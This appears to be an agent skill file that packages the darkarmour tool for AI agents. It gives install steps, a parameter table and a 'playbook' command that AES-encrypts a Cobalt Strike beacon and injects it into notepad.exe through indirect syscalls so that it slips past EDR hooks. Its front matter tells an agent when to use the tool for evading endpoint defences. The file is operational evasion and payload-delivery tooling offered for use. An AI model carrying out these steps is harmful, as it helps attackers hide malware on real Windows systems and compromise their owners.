---
name: darkarmour-obfuscate
description: "darkarmour: Delivers payloads in EDR environments. Signals: malware development, evasion development, AES encryption, process injection, indirect syscall."
zh-signals: "darkarmour: EDR 环境载荷投递。信号:恶意软件开发,免杀开发,AES 加密,进程注入,间接 syscall。"
when-to-use: >-
  Use when delivering payloads into EDR-protected Windows environments and you
  need encryption plus direct or indirect syscall injection to evade hooks.
---

# darkarmour

- Attack Category: C45 AV Evasion and Payload Delivery
- Upstream Repository: https://github.com/bats3c/darkarmour
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/bats3c/darkarmour && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 darkarmour.py -f payload.exe -e xor -j -i` | XOR encryption + direct syscall injection |
| `-e aes` | AES encryption |
| `-j` | Process injection |
| `-i` | Indirect syscall |
| `-p wordpad.exe` | Injection host |

## Attack Scenario Playbook

### Payload Delivery in EDR Environments

```bash
python3 darkarmour.py -f beacon.exe -e aes -j -i -p notepad.exe
# AES encrypted shell + indirect syscall to bypass hooks
```

## Notes

By bats3c, encryption plus direct/indirect syscall injection for AV evasion, compatible with Cobalt Strike payloads.
